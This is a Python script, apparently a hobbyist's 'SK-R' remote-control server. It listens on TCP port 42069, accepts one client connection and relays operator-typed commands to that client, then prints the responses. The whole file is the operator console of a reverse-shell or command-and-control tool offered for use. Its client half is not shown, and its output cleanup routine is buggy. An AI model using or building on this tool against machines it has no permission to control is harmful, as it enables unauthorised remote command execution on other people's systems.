#Written by Skittles_

#Imports
import socket
import colors
import os
import sys

#Variables
lHost = ''
lport = 42069
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hostIp = socket.gethostname()
msg = ''

#Functions
def banner():
    #TBD: Cool Ascii Art.
    print('')

def clearScreen():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

def cleanUpResponse(inputStr):
 remove_from = ['b\\\'', '\'', '\\n']
 outstring = inputStr

 for i in remove_from:
     if i == '\\n':
         outstring = outstring.replace(i, '\n')
     else:
         outstring = outstring.replace(i, '')
     outstring = outstring.replace('b', '', 1)

 print(outstring)




#Start server.
print(colors.cyan('Starting Server...'))
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serversocket.bind((lHost, lport))
print(colors.red('Socket Bound...'))
serversocket.listen(1)
print(colors.yellow('Listening...'))

#Accept server connection
clientsocket, address = serversocket.accept()
clearScreen()
print(colors.green('Connection recieved, ' + str(address)))

#While connected, Take commands, check for help message, or send to client.
while True:
  cmmd = input(colors.cyan('|SK-R>') + colors.red('>') + colors.yellow('>'))

  if cmmd == 'help':
    print(colors.green('|---HELP---| \n \n ') + colors.cyan('Possible Commands For SK-R: \n \n -- \"ping\", used to check connection. \n \n -- \"os\", Check the operating system of the client. \n \n -- \"Disconn\", Disconnect the client from the server. \n \n -- \"exit\", exit SK-R. \n \n -- \"clear\", clears the screen. \n \n ') + colors.green('|---HELP---|'))

  elif cmmd == 'exit':
    print(colors.red('Exiting...'))
    serversocket.close()
    sys.exit()

  elif cmmd == 'clear':
    clearScreen()

  elif cmmd == 'banner':
    banner()

  else:
    #Send command to client.
    clientsocket.send(cmmd.encode("UTF-8"))

    #recieve response
    fromClient = clientsocket.recv(4096)

    #Decode, clean, and print reponse to screen.
    decodedFromClient = fromClient.decode("UTF-8")
    outToScreen = cleanUpResponse(decodedFromClient)


#Written by Skittles_
